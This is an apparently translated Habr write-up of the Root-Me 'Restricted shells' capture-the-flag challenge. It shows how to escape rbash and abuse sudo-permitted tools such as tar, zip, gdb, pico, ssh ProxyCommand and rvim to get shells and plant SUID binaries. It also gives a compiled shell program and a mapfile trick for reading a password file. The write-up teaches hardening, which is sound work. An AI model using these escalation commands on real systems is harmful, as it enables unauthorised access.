<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Do not trust SUDO, she can let you down</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day to all, in this article I will try to describe some ways to circumvent the restrictions on the execution of commands in the OS Linux, tips on...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Do not trust SUDO, she can let you down</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/files/00a/655/8ed/00a6558edbcf4566b6033f60e21acb3d.png"></div><br>  Good day to all, in this article I will try to describe some ways to circumvent the restrictions on the execution of commands in the OS Linux, tips on the use of which can often be found in various forums.  The demonstration will be held on the example of the <a href="https://www.root-me.org/en/Challenges/App-Script/Restricted-shells">Restricted shells</a> job from the <a href="https://www.root-me.org/">Root-Me</a> site.  So, let's begin. <a name="habracut"></a><br><br><h3>  User ch14-1 </h3><br>  After connecting via <i>SSH,</i> we get to the first user, and we see a hint: ‚ÄúAlways check sudo -l‚Äù.  But first you need to bypass the first obstacle, this is <i>rbash</i> , which is often recommended to be used to limit user actions in the command shell.  And indeed, in appearance, it is a good solution, but not always! <br><br>  We were prevented from using <i>ls</i> , but we can display the contents of any directory using <i>echo</i> : 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="bash hljs">app-script-ch14@challenge02:~$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ./step1/* ./step1/vim</code> </pre> <br>  Usually, the list of binaries allowed to run in <i>rbash</i> is in the so-called home directory.  In this case, <i>vim</i> is available to us, using which we can exit to the normal shell.  Run <i>vim</i> and enter the commands: <br><br><pre> <code class="bash hljs">:<span class="hljs-built_in"><span class="hljs-built_in">set</span></span> shell=/bin/bash :shell</code> </pre> <br><img src="https://habrastorage.org/files/a06/597/64e/a0659764e4e64354a2285ceb3475c9a8.png"><br><br>  <i>Sudo</i> allows us to run <i>python</i> , and given its endless possibilities, this is not entirely safe, and here's why: <br><br><pre> <code class="bash hljs">app-script-ch14@challenge02:~$ /usr/bin/sudo -u app-script-ch14-2 /usr/bin/python</code> </pre> <br>  Enter the following commands: <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os &gt;&gt;&gt; os.system(<span class="hljs-string"><span class="hljs-string">'/bin/bash'</span></span>)</code> </pre> <br><img src="https://habrastorage.org/files/37c/e16/2a5/37ce162a551540239bd8dc8bd3adfd59.png"><br><br><h3>  User ch14-2 </h3><br>  And we get to the next user to whom the <i>tar</i> archiver is available. <br><br><pre> <code class="bash hljs">app-script-ch14-2@challenge02:~$ /usr/bin/sudo -l (app-script-ch14-3) NOPASSWD: /bin/tar</code> </pre> <br>  It would seem that in this dangerous?  However, <i>tar</i> , like many other archivers, allows you to pack and unpack a file while retaining access rights to it.  Create a <i>shell.c</i> file <i>with the</i> following content: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv, char **envp) { setresgid(getegid(), getegid(), getegid()); setresuid(geteuid(), geteuid(), geteuid()); execve("/bin/sh", argv, envp); return 0; }</span></span></span></span></code> </pre> <br>  Compile and add the <i>SUID</i> bit: <br><br><pre> <code class="bash hljs">app-script-ch14-2@challenge02:/tmp/lev2$ gcc shell.c -o shell &amp;&amp; chmod 777 shell &amp;&amp; chmod +s shell</code> </pre> <br>  Now unpack with the rights using <i>sudo</i> : <br><br><pre> <code class="bash hljs">app-script-ch14-2@challenge02:/tmp/lev2$ sudo -u app-script-ch14-3 /bin/tar -cf ./test.tar ./shell app-script-ch14-2@challenge02:/tmp/lev2$ sudo -u app-script-ch14-3 /bin/tar -xvpf ./test.tar</code> </pre> <br>  As a result, after unzipping, the <i>shell</i> file acquires a new owner.  You can verify this by running <i>ls-ahl</i> : <br><blockquote>  -rwsrwsrwx 1 app-script-ch14-3 app-script-ch14 7.2K Feb 14 22:39 shell </blockquote><br>  After launch, we get to the next level: <br><br><img src="https://habrastorage.org/files/7b8/dcc/186/7b8dcc18693e48a8b76587cb438d22a9.png"><br><br><h3>  User ch14-3 </h3><br>  Check <i>sudo</i> again: <br><br><pre> <code class="bash hljs">app-script-ch14-3@challenge02:/tmp/lev2$ sudo -l (app-script-ch14-4) NOPASSWD: /usr/bin/zip</code> </pre> <br>  This time it is already better, by default, <i>zip</i> only packs files, unzip is needed for unpacking, which we can not run, or can we? <br><br>  Looking into the <i>man</i> at <i>zip</i> 'y, we find an interesting parameter there: <br><blockquote>  -TT <i>cmd</i> --unzip-command cmd <br>  Use command <i>cmd</i> instead of 'unzip -tqq' to test an archive when the -T option is used.  On Unix, unzip, could use: <br><br><pre> <code class="bash hljs">zip archive file1 file2 -T -TT <span class="hljs-string"><span class="hljs-string">"./unzip -tqq"</span></span></code> </pre> <br>  In <i>cmd</i> , it has been appended.  The return code is checked for success (0 on Unix) </blockquote><br>  Here is the answer.  We start archiving followed by testing the archive, and as a command to check, we specify <i>unzip</i> , which will unpack the file into the current directory, of course, with preservation of access rights: <br><br><pre> <code class="bash hljs">app-script-ch14-3@challenge02:/tmp/lev2$ sudo -u app-script-ch14-4 /usr/bin/zip z shell -TT <span class="hljs-string"><span class="hljs-string">'/usr/bin/unzip -K {}'</span></span> -T updating: shell (deflated 67%) Archive: ziFiNi11 replace shell? [y]es, [n]o, [A]ll, [N]one, [r]ename: y inflating: shell <span class="hljs-built_in"><span class="hljs-built_in">test</span></span> of z.zip OK</code> </pre> <br>  Check the result: <br><br><pre> <code class="bash hljs">app-script-ch14-3@challenge02:/tmp/lev2$ ls -ahl shell -rwsrwsrwx 1 app-script-ch14-4 app-script-ch14 7.2K Feb 15 21:48 shell</code> </pre> <br><img src="https://habrastorage.org/files/7ad/d4a/527/7add4a5272364719bd77922f0d948da0.png"><br><br><h3>  User ch14-4 </h3><br>  We look that is available to him: <br><br><pre> <code class="bash hljs">app-script-ch14-4@challenge02:/tmp/lev2$ sudo -l | grep NOPASSWD (app-script-ch14-5) NOPASSWD: /usr/bin/awk</code> </pre> <br>  Well, everything is simple, just run the command, the description of which can be easily found on the network: <br><br><pre> <code class="bash hljs">awk <span class="hljs-string"><span class="hljs-string">'BEGIN {system("/bin/bash")}'</span></span></code> </pre> <br><img src="https://habrastorage.org/files/253/289/0cb/2532890cb39a421bbdf5b8f8e7f51a3d.png"><br><br><h3>  User ch14-5 </h3><br>  New user and new restrictions: <br><br><pre> <code class="bash hljs">app-script-ch14-5@challenge02:/tmp/lev2$ sudo -l | grep NOPASSWD (app-script-ch14-6) NOPASSWD: /usr/bin/gdb</code> </pre> <br>  <i>GDB is a</i> pretty powerful debugger, and there are more ways to call <i>bash</i> on it: <br>  The first is through the built-in <i>Python</i> : <br><br><pre> <code class="bash hljs">(gdb) python import os; os.system(<span class="hljs-string"><span class="hljs-string">'id'</span></span>) uid=1506(app-script-ch14-6) gid=1314(app-script-ch14) groups=1314(app-script-ch14),100(users) (gdb) python import os; os.system(<span class="hljs-string"><span class="hljs-string">'/bin/bash'</span></span>)</code> </pre> <br>  Or similarly, as it was done with <i>vim</i> : <br><br><pre> <code class="bash hljs">app-script-ch14-5@challenge02:/tmp/lev2$ sudo -u app-script-ch14-6 /usr/bin/gdb -q -ex <span class="hljs-string"><span class="hljs-string">"set shell='/bin/bash'"</span></span> /bin/ls (gdb) shell</code> </pre> <br><img src="https://habrastorage.org/files/6ad/779/3e1/6ad7793e1fa4431cb0bed60e372019f4.png"><br><br><h3>  User ch14-6 </h3><br>  If you think: ‚ÄúWhat can be done through such a simple editor as pico‚Äù, then you probably don‚Äôt know about his spell check, which is by the way written in <i>man</i> .  And it says the following, that as a utility for checking spelling, we can specify anything.  We already have an excellent binary to run the shell, you just need to give it the appropriate rights.  To do this, create a <i>spellbash.sh</i> file with the following contents: <br><br><div class="spoiler">  <b class="spoiler_title">spellbash.sh</b> <div class="spoiler_text"><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash gcc shell.c -o shell chmod 777 shell chmod +s shell</span></span></code> </pre> <br></div></div><br>  We change the rights: <br><br><pre> <code class="bash hljs">chmod 777 spellbash.sh</code> </pre> <br>  And run <i>pico</i> , passing our script to it as a spell checker: <br><br><pre> <code class="bash hljs">app-script-ch14-6@challenge02:/tmp/lev2$ sudo -u app-script-ch14-7 /usr/bin/pico -s ./spellbash.sh</code> </pre> <br><img src="https://habrastorage.org/files/602/747/d2e/602747d2e22e440e8232686d817f777f.png"><br><br>  After a successful spell check and closing editor, our script is ready to run: <br><br><pre> <code class="bash hljs">app-script-ch14-6@challenge02:/tmp/lev2$ ls -ahl shell -rwsrwsrwx 1 app-script-ch14-7 app-script-ch14 7.2K Feb 15 23:02 shell</code> </pre> <br><img src="https://habrastorage.org/files/819/653/9ca/8196539ca20d4c24944d6bf149649e5e.png"><br><br><h3>  User ch14-7 </h3><br>  Well, we don‚Äôt need to comment on all the consequences of providing access to copying files over the network, but since we don‚Äôt have access to the network, we‚Äôll recognize the following by running <i>man</i> : <br><blockquote>  -S <i>program</i> - for the encrypted connection.  Ssh (1) options. </blockquote><br>  Ok, actions are similar to the previous level: <br><br><pre> <code class="bash hljs">app-script-ch14-7@challenge02:/tmp/lev2$ sudo -u app-script-ch14-8 /usr/bin/scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./ app-script-ch14-7@challenge02:/tmp/lev2$ ls -ahl shell -rwsrwsrwx 1 app-script-ch14-8 app-script-ch14 7.2K Feb 15 23:09 shell</code> </pre> <br><img src="https://habrastorage.org/files/a8c/fdb/228/a8cfdb2281494c9d99545a638f56fc09.png"><br><br><h3>  User ch14-8 </h3><br>  But this is already interesting.  However, there are pitfalls.  For example, if you run <i>man</i> , and click " <i>h</i> " online, the help will be displayed where you can find the following entry: <br><blockquote>  ! command Execute the shell command with $ SHELL. </blockquote><br>  Direct execution of shell commands.  What we need, open <i>man</i> for any command, and enter <i>! / Bin / bash</i> : <br><br><pre> <code class="bash hljs">app-script-ch14-8@challenge02:/tmp/lev2$ sudo -u app-script-ch14-9 /usr/bin/man ls</code> </pre> <br><img src="https://habrastorage.org/files/cac/0a4/32f/cac0a432f5b441f9894aa7ef3beb62bd.png"><br><br><h3>  User ch14-9 </h3><br>  Since we do not have the right to connect to an external server, we need a way to execute the command before the connection is established.  And there is such an opportunity, we will use the advice described <a href="http://unix.stackexchange.com/questions/44307/can-ssh-configs-proxycommand-run-a-local-command-before-connecting-to-a-remote">here</a> : <br><br><pre> <code class="bash hljs">app-script-ch14-9@challenge02:/tmp/lev2$ sudo -u app-script-ch14-10 /usr/bin/ssh -o ProxyCommand=<span class="hljs-string"><span class="hljs-string">"sh -c './spellbash.sh'"</span></span> 127.0.0.1</code> </pre> <br>  We receive a message that the connection is reset, but this is not important, because: <br><br><pre> <code class="bash hljs">app-script-ch14-9@challenge02:/tmp/lev2$ ls -ahl shell -rwsrwsrwx 1 app-script-ch14-10 app-script-ch14 7.2K Feb 18 21:34 shell</code> </pre> <br><img src="https://habrastorage.org/files/206/3d8/03a/2063d803a1654bb68ac6886b1ed89abd.png"><br><br><h3>  User ch14-10 </h3><br>  <i>Git</i> also provides many ways to execute a third-party command, we will use the simplest of them, which we used with <i>man</i> : <br><br><pre> <code class="bash hljs">app-script-ch14-10@challenge02:/tmp/lev2$ sudo -u app-script-ch14-11 /usr/bin/git <span class="hljs-built_in"><span class="hljs-built_in">help</span></span> status</code> </pre> <br>  Next, enter <i>! / Bin / bash</i> and get to the following user: <br><br><img src="https://habrastorage.org/files/717/06e/a5d/71706ea5d0724dbea1a331d56ffa2eed.png"><br><br><h3>  User ch14-11 </h3><br>  So we‚Äôve come to another common advice, instead of using <i>vim to</i> use its limited version of <i>rvim</i> and here‚Äôs why: Trying the same method that was used at the very beginning for <i>vim</i> , we get an error: <br><br><img src="https://habrastorage.org/files/379/19c/b85/37919cb853a8482795c2985427267449.png"><br><br>  But here there are loopholes ... Looking through the list of available commands, you can stumble upon the commands <i>: python</i> and <i>: lua</i> .  Restricted by the direct execution of <i>rvim</i> commands was not so safe. <br><br><pre> <code class="bash hljs">:python import os; os.system(<span class="hljs-string"><span class="hljs-string">'gcc shell.c -o shell &amp;&amp; chmod 777 shell &amp;&amp; chmod +s shell'</span></span>)</code> </pre> <br><img src="https://habrastorage.org/files/41a/fcc/5fd/41afcc5fdbd74582966a8236c86baac6.png"><br><br><h3>  User ch14-12 </h3><br>  <i>The script</i> starts a new session, and completely logs everything into the specified file, so just run: <br><br><pre> <code class="bash hljs">app-script-ch14-12@challenge02:/tmp/lev2$ sudo -u app-script-ch14-13 /usr/bin/script script.sh</code> </pre> <br><img src="https://habrastorage.org/files/3bc/1d1/2ba/3bc1d12ba95044199125d0e5eef48dd6.png"><br><br><h3>  User ch14-13 </h3><br>  Here, too, nothing complicated, so just run and get back to the "beginning": <br><br><pre> <code class="bash hljs">app-script-ch14-13@challenge02:/tmp/lev2$ sudo -u app-script-ch14-14 /bin/rbash --</code> </pre> <br><img src="https://habrastorage.org/files/782/244/c18/782244c183e2451fa7afaf954eb9b279.png"><br><br><h3>  User ch14-14 </h3><br>  This time, the authors took into account the errors, and removed <i>vim</i> : <br><br><pre> <code class="bash hljs">app-script-ch14-14@challenge02:~/step14$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ./* ./sl</code> </pre> <br>  When executing the command, as you can guess, the animation of the locomotive appears and the inscription <blockquote>  THE GAME IS OVER! </blockquote><br>  But we did not receive the contents of the .passwd file required by the job condition.  So this is not the end. <br><br>  Let's see the list of commands that are available: <br><br><div class="spoiler">  <b class="spoiler_title">[TAB] [TAB]</b> <div class="spoiler_text"><pre> <code class="bash hljs">! <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> <span class="hljs-built_in"><span class="hljs-built_in">pushd</span></span> ./ <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> : <span class="hljs-built_in"><span class="hljs-built_in">enable</span></span> <span class="hljs-built_in"><span class="hljs-built_in">readonly</span></span> [ <span class="hljs-keyword"><span class="hljs-keyword">esac</span></span> <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> [[ <span class="hljs-built_in"><span class="hljs-built_in">eval</span></span> select ]] <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> <span class="hljs-built_in"><span class="hljs-built_in">alias</span></span> <span class="hljs-built_in"><span class="hljs-built_in">export</span></span> <span class="hljs-built_in"><span class="hljs-built_in">shift</span></span> <span class="hljs-built_in"><span class="hljs-built_in">bg</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span> <span class="hljs-built_in"><span class="hljs-built_in">shopt</span></span> <span class="hljs-built_in"><span class="hljs-built_in">bind</span></span> <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> sl <span class="hljs-built_in"><span class="hljs-built_in">break</span></span> <span class="hljs-built_in"><span class="hljs-built_in">fg</span></span> <span class="hljs-built_in"><span class="hljs-built_in">suspend</span></span> <span class="hljs-built_in"><span class="hljs-built_in">builtin</span></span> <span class="hljs-keyword"><span class="hljs-keyword">fi</span></span> <span class="hljs-built_in"><span class="hljs-built_in">test</span></span> <span class="hljs-built_in"><span class="hljs-built_in">caller</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> time <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">getopts</span></span> <span class="hljs-built_in"><span class="hljs-built_in">times</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> <span class="hljs-built_in"><span class="hljs-built_in">hash</span></span> <span class="hljs-built_in"><span class="hljs-built_in">trap</span></span> command_not_found_handle <span class="hljs-built_in"><span class="hljs-built_in">help</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span> compgen <span class="hljs-built_in"><span class="hljs-built_in">history</span></span> <span class="hljs-built_in"><span class="hljs-built_in">type</span></span> complete <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-built_in"><span class="hljs-built_in">typeset</span></span> compopt <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-built_in"><span class="hljs-built_in">ulimit</span></span> <span class="hljs-built_in"><span class="hljs-built_in">continue</span></span> <span class="hljs-built_in"><span class="hljs-built_in">jobs</span></span> <span class="hljs-built_in"><span class="hljs-built_in">umask</span></span> coproc <span class="hljs-built_in"><span class="hljs-built_in">kill</span></span> <span class="hljs-built_in"><span class="hljs-built_in">unalias</span></span> <span class="hljs-built_in"><span class="hljs-built_in">declare</span></span> <span class="hljs-built_in"><span class="hljs-built_in">let</span></span> <span class="hljs-built_in"><span class="hljs-built_in">unset</span></span> <span class="hljs-built_in"><span class="hljs-built_in">dirs</span></span> <span class="hljs-built_in"><span class="hljs-built_in">local</span></span> until <span class="hljs-built_in"><span class="hljs-built_in">disown</span></span> <span class="hljs-built_in"><span class="hljs-built_in">logout</span></span> <span class="hljs-built_in"><span class="hljs-built_in">wait</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">mapfile</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> <span class="hljs-built_in"><span class="hljs-built_in">popd</span></span> { <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> }</code> </pre><br></div></div><br>  Not much, but there are several ways to get the contents of the <i>.passwd</i> file, there will be only 1 of them, the rest I will leave to you for an independent search.  And so, looking through the <i>help</i> for each available command, we find one of them quite interesting: <br><br><div class="spoiler">  <b class="spoiler_title">help mapfile</b> <div class="spoiler_text"><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">mapfile</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">mapfile</span></span> [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array] Read lines from the standard input into an indexed array variable. Read lines from the standard input into the indexed array variable ARRAY, or from file descriptor FD <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> the -u option is supplied. The variable MAPFILE is the default ARRAY. Options: -n count Copy at most COUNT lines. If COUNT is 0, all lines are copied. -O origin Begin assigning to ARRAY at index ORIGIN. The default index is 0. -s count Discard the first COUNT lines <span class="hljs-built_in"><span class="hljs-built_in">read</span></span>. -t Remove a trailing newline from each line <span class="hljs-built_in"><span class="hljs-built_in">read</span></span>. -u fd Read lines from file descriptor FD instead of the standard input. -C callback Evaluate CALLBACK each time QUANTUM lines are <span class="hljs-built_in"><span class="hljs-built_in">read</span></span>. -c quantum Specify the number of lines <span class="hljs-built_in"><span class="hljs-built_in">read</span></span> between each call to CALLBACK. Arguments: ARRAY Array variable name to use <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> file data. If -C is supplied without -c, the default quantum is 5000. When CALLBACK is evaluated, it is supplied the index of the next array element to be assigned and the line to be assigned to that element as additional arguments. If not supplied with an explicit origin, <span class="hljs-built_in"><span class="hljs-built_in">mapfile</span></span> will clear ARRAY before assigning to it. Exit Status: Returns success unless an invalid option is given or ARRAY is <span class="hljs-built_in"><span class="hljs-built_in">readonly</span></span> or not an indexed array.</code> </pre><br></div></div><br>  After a brief search on the network for examples of its use, we find <a href="https://peniwize.wordpress.com/2011/04/09/how-to-read-all-lines-of-a-file-into-a-bash-array/">an article</a> that describes the way to read an arbitrary file in an environment variable using this command. <br><br>  Using the advice, we perform: <br><br><pre> <code class="bash hljs">app-script-ch14-14@challenge02:~/step14$ <span class="hljs-built_in"><span class="hljs-built_in">mapfile</span></span> ARRAY &lt; ../.passwd ARRAY app-script-ch14-14@challenge02:~/step14$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-variable"><span class="hljs-variable">$ARRAY</span></span></code> </pre> <br>  And we get the desired password. <br><br>  Now, adding the ability to run any program in the <i>sudoers</i> file, do not be lazy and read its full description, because perhaps it will become the main security hole. <br><br>  <i>PS In fact, for each of the levels there is a certain set of solutions, and finding your own path will be much more interesting.</i> </div><p>Source: <a href="https://habr.com/ru/post/321760/">https://habr.com/ru/post/321760/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../321748/index.html">JavaScript start performance</a></li>
<li><a href="../321750/index.html">Foreign GPS monitoring services</a></li>
<li><a href="../321754/index.html">How to ‚Äúpunch‚Äù a person on the Internet: using Google operators and logic</a></li>
<li><a href="../321756/index.html">The success story of Yandex.Mail with PostgreSQL</a></li>
<li><a href="../321758/index.html">Introducing web single sign-on (Web SSO) and identity federation</a></li>
<li><a href="../321764/index.html">About the organization of Telephony in the Sales Department and integration with CRM</a></li>
<li><a href="../321766/index.html">Content filtering by state order. The case of educational blocking RosKomSvoboda</a></li>
<li><a href="../321768/index.html">Changing the contents of Web.config at runtime when debugging in Visual Studio and IISExpress</a></li>
<li><a href="../321770/index.html">Speed ‚Äã‚Äãreading How to quickly absorb information, knowing the structure of the text</a></li>
<li><a href="../321772/index.html">Virtual Quest Rakes, Part One: Game Design, Developers, Slam Choice</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>